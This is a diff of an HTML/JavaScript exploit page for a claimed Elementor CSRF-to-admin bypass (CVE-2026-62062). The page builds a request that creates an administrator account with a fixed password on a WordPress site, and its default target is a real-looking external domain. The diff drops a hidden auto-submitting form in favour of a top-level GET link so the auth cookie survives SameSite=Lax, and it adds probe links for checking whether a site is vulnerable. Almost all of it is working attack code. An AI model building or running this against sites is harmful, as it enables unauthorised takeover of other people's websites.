@@ -5,96 +5,93 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Elementor CSRF → Admin (CVE-2026-62062) — self-test</title>
 <style>
-  :root{--bd:#d0d7de}
-  body{font-family:system-ui,-apple-system,Segoe UI,sans-serif;max-width:820px;margin:32px auto;padding:0 16px;line-height:1.55;color:#1f2328}
-  h1{font-size:1.4rem}
-  label{display:block;font-weight:600;margin-top:18px}
-  input,select,textarea{width:100%;box-sizing:border-box;padding:8px;margin:6px 0;
-    border:1px solid var(--bd);border-radius:6px;font-family:ui-monospace,monospace;font-size:13px}
-  button{padding:12px 20px;font-size:15px;border:1px solid #1f2328;border-radius:6px;
-    background:#b3261e;color:#fff;cursor:pointer;margin-top:10px}
-  button.sec{background:#f6f8fa;color:#1f2328}
-  .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  body{font-family:system-ui,sans-serif;max-width:820px;margin:32px auto;padding:0 16px;line-height:1.55;color:#1f2328}
+  h1{font-size:1.35rem} h2{font-size:1.1rem;margin-top:28px}
+  input,select{width:100%;box-sizing:border-box;padding:8px;margin:6px 0;border:1px solid #d0d7de;
+    border-radius:6px;font-family:ui-monospace,monospace;font-size:13px}
+  a.btn{display:inline-block;margin:12px 0;padding:13px 22px;font-size:16px;font-weight:600;
+    background:#b3261e;color:#fff;text-decoration:none;border-radius:6px}
+  a.btn:hover{background:#8c1d18}
   .note{background:#fff8e1;border-left:4px solid #f0a000;padding:10px 14px;border-radius:4px;margin:16px 0}
-  .ok{background:#e6ffed;border-left:4px solid #2da44e;padding:10px 14px;border-radius:4px}
+  .warn{background:#ffebe9;border-left:4px solid #cf222e;padding:10px 14px;border-radius:4px;margin:16px 0}
   table{border-collapse:collapse;width:100%;font-size:13px;margin-top:10px}
-  td,th{border:1px solid var(--bd);padding:6px 8px;text-align:left}
-  iframe{width:100%;height:180px;border:1px solid var(--bd);border-radius:6px;background:#fff}
+  td,th{border:1px solid #d0d7de;padding:7px 9px;text-align:left;vertical-align:top}
+  code{font-family:ui-monospace,monospace;font-size:12px;word-break:break-all}
+  a.diag{color:#0969da;text-decoration:none;font-family:ui-monospace,monospace;font-size:12px;word-break:break-all}
+  a.diag:hover{text-decoration:underline}
 </style>
 </head>
 <body>
-  <h1>Elementor 4.3.0 / 4.3.1 — CSRF → Admin Creator</h1>
+  <h1>Elementor 4.3.0 / 4.3.1 — CSRF → Admin</h1>
 
   <div class="note">
-    <strong>Self-test only.</strong> You must be logged in as administrator on the target
-    <em>in this same browser</em> first. Then use the form (recommended) or the link.
+    Log in to the target as administrator <strong>in this same browser</strong> first.
+    Then click the button — it opens a <strong>new tab / top-level GET</strong>, which is required
+    for the auth cookie to be sent under <code>SameSite=Lax</code>.
+  </div>
+
+  <div class="warn">
+    Do <strong>not</strong> use a form, iframe, or fetch — cross-site POST/subresource requests drop the
+    WordPress auth cookie and you'll get <code>rest_cannot_create_user</code> every time.
   </div>
 
   <label>Target base URL</label>
   <input id="target" value="https://mrgm.co.ke" spellcheck="false">
 
-  <div class="grid">
-    <div>
-      <label>Endpoint style</label>
-      <select id="style">
-        <option value="wpjson">/wp-json/ path</option>
-        <option value="restroute">?rest_route= fallback</option>
-      </select>
-    </div>
-    <div>
-      <label>Marker variant</label>
-      <select id="variant">
-        <option value="good">elementor/v1/events/  (should work)</option>
-        <option value="short">elementor/v1/event/   (control: must fail)</option>
-        <option value="none">(no marker — control: must fail)</option>
-      </select>
-    </div>
-  </div>
+  <label>Marker variant</label>
+  <select id="variant">
+    <option value="good">elementor/v1/events/ — should succeed</option>
+    <option value="short">elementor/v1/event/ — control, must fail</option>
+    <option value="none">(no marker) — control, must fail</option>
+  </select>
 
-  <label>Username / password created on success</label>
-  <input id="creds" value="test : Mike@17894" readonly>
+  <a id="run" class="btn" href="#" target="_blank" rel="noopener">Create "test" admin →</a>
+  <p style="font-size:12px;color:#57606a;margin-top:-6px">Opens in a new tab. A JSON body = result.</p>
 
-  <label>Payload URL (literal slashes in the marker)</label>
-  <textarea id="payload" rows="3" readonly spellcheck="false"></textarea>
-
-  <h2 style="font-size:1.1rem;margin-top:24px">Run</h2>
-  <button id="run">Run (form POST) — recommended</button>
-  <button id="open" class="sec">Open link (GET + _method) in new tab</button>
-
+  <h2>Diagnostic links (all clickable)</h2>
   <p style="font-size:13px;color:#57606a">
-    The form POST is the strongest path: no JS, no <code>_method</code>, no CSP involvement.
-    The response will render in the frame below (hidden if the browser blocks cross-origin, in which
-    case check the Network tab or <code>wp user list --role=administrator</code> on the server).
+    Click each, in order, while logged in. Paste the results if the main button still 401s.
   </p>
-
-  <label>Server response / last navigation</label>
-  <iframe id="out" name="out"></iframe>
-
-  <!-- Hidden auto-built form; its target is the invisible iframe -->
-  <form id="csrf" method="POST" target="out" style="display:none"></form>
-
-  <h2 style="font-size:1.1rem;margin-top:28px">Diagnostic matrix</h2>
-  <table id="diag">
-    <thead><tr><th>Request</th><th>Expected if vulnerable + logged in</th></tr></thead>
+  <table>
+    <thead><tr><th>Test</th><th>What it proves</th><th>Expected if vulnerable</th></tr></thead>
     <tbody>
-      <tr><td>GET <code>/wp-json/wp/v2/users/me?x=elementor/v1/events/</code></td><td>200 + your user object</td></tr>
-      <tr><td>GET <code>/wp-json/wp/v2/settings?x=elementor/v1/events/</code></td><td>200 + site settings</td></tr>
-      <tr><td>Same, marker encoded <code>%2F</code></td><td>401 — proves the substring must be literal</td></tr>
-      <tr><td>Same, no marker</td><td>401 <code>rest_cannot_create_user</code></td></tr>
+      <tr>
+        <td><a class="diag" id="d1" href="#" target="_blank" rel="noopener"></a></td>
+        <td>Session valid + bypass active (read-only, creates nothing)</td>
+        <td>200 + your user object</td>
+      </tr>
+      <tr>
+        <td><a class="diag" id="d2" href="#" target="_blank" rel="noopener"></a></td>
+        <td>Marker encoded as <code>%2F</code> — proves substring must be literal</td>
+        <td>401 <code>rest_cannot_create_user</code></td>
+      </tr>
+      <tr>
+        <td><a class="diag" id="d3" href="#" target="_blank" rel="noopener"></a></td>
+        <td>No marker — control</td>
+        <td>401 <code>rest_cannot_create_user</code></td>
+      </tr>
+      <tr>
+        <td><a class="diag" id="d4" href="#" target="_blank" rel="noopener"></a></td>
+        <td><code>?rest_route=</code> form of the same bypass</td>
+        <td>200 / 201</td>
+      </tr>
+      <tr>
+        <td><a class="diag" id="d5" href="#" target="_blank" rel="noopener"></a></td>
+        <td>Are you actually logged in?</td>
+        <td>200 (not redirected to login)</td>
+      </tr>
     </tbody>
   </table>
 
-  <p id="chk" class="ok" style="display:none">
-    Before running: confirm in this browser that
-    <a id="profile" href="#" target="_blank">/wp-admin/profile.php</a> loads <em>without</em> redirecting to login.
-    If it redirects, you are not authenticated and every request will 401.
+  <p style="font-size:13px;color:#57606a;margin-top:14px">
+    Elementor version check (paste the URL in a tab, or curl it):<br>
+    <a class="diag" id="d6" href="#" target="_blank" rel="noopener"></a>
   </p>
 
 <script>
 (function () {
-  var MARKER = 'elementor/v1/events/';   // literal slashes — never percent-encode
+  var MARKER = 'elementor/v1/events/';   // literal slashes
   var SHORT  = 'elementor/v1/event/';
-
   var $ = function (id) { return document.getElementById(id); };
 
   function base() { return $('target').value.replace(/\/+$/, ''); }
@@ -106,71 +103,40 @@
     return MARKER;
   }
 
-  // Build a GET URL by hand so '/', '?', '&' and the marker stay literal.
-  function getUrl() {
-    var q = '_method=POST'
-          + '&username=test'
-          + '&email=test%40example.test'
-          + '&password=Mike%4017894'
-          + '&roles%5B%5D=administrator';
+  var CREDS = 'username=test&email=test%40example.test'
+            + '&password=Mike%4017894&roles%5B%5D=administrator';
+
+  function createUrl() {
     var m = marker();
-    if (m) q += '&x=' + m;                        // literal marker
-    if ($('style').value === 'restroute') {
-      return base() + '/index.php?rest_route=/wp/v2/users&' + q;
-    }
+    var q = '_method=POST&' + CREDS + (m ? '&x=' + m : '');
     return base() + '/wp-json/wp/v2/users?' + q;
   }
 
-  // Form POST action URL (marker in the query string, fields in the body).
-  function postAction() {
-    var m = marker();
-    var q = m ? ('x=' + m) : '';
-    if ($('style').value === 'restroute') {
-      return base() + '/index.php?rest_route=/wp/v2/users' + (q ? '&' + q : '');
-    }
-    return base() + '/wp-json/wp/v2/users' + (q ? '?' + q : '');
-  }
-
-  function rebuildForm() {
-    var f = $('csrf');
-    f.action = postAction();
-    f.innerHTML = '';
-    var fields = {
-      'username': 'test',
-      'email': 'test@example.test',
-      'password': 'Mike@17894',
-      'roles[]': 'administrator'
-    };
-    Object.keys(fields).forEach(function (name) {
-      var i = document.createElement('input');
-      i.type = 'hidden'; i.name = name; i.value = fields[name];
-      f.appendChild(i);
-    });
-  }
-
   function render() {
-    $('payload').value = getUrl();
-    $('profile').href = base() + '/wp-admin/profile.php';
-    $('chk').style.display = 'block';
-    rebuildForm();
+    var b = base();
+    $('run').href = createUrl();
+    // d1: users/me with good marker
+    $('d1').href = b + '/wp-json/wp/v2/users/me?x=' + MARKER;
+    $('d1').textContent = '/wp-json/wp/v2/users/me?x=' + MARKER;
+    // d2: encoded marker (control)
+    $('d2').href = b + '/wp-json/wp/v2/users/me?x=elementor%2Fv1%2Fevents%2F';
+    $('d2').textContent = '/wp-json/wp/v2/users/me?x=elementor%2Fv1%2Fevents%2F';
+    // d3: no marker (control)
+    $('d3').href = b + '/wp-json/wp/v2/users/me';
+    $('d3').textContent = '/wp-json/wp/v2/users/me';
+    // d4: rest_route form of the create
+    $('d4').href = b + '/index.php?rest_route=/wp/v2/users/me&x=' + MARKER;
+    $('d4').textContent = '/index.php?rest_route=/wp/v2/users/me&x=' + MARKER;
+    // d5: profile
+    $('d5').href = b + '/wp-admin/profile.php';
+    $('d5').textContent = '/wp-admin/profile.php';
+    // d6: readme version
+    $('d6').href = b + '/wp-content/plugins/elementor/readme.txt';
+    $('d6').textContent = '/wp-content/plugins/elementor/readme.txt';
   }
 
-  ['target', 'style', 'variant'].forEach(function (id) {
-    $(id).addEventListener('input', render);
-    $(id).addEventListener('change', render);
-  });
-
-  // Form POST: safest, no JS in the exploit itself.
-  $('run').addEventListener('click', function () {
-    rebuildForm();
-    $('csrf').submit();
-  });
-
-  // Link navigation: shows the JSON response directly in a new tab.
-  $('open').addEventListener('click', function () {
-    window.open(getUrl(), '_blank', 'noopener');
-  });
-
+  $('target').addEventListener('input', render);
+  $('variant').addEventListener('change', render);
   render();
 })();
 </script>
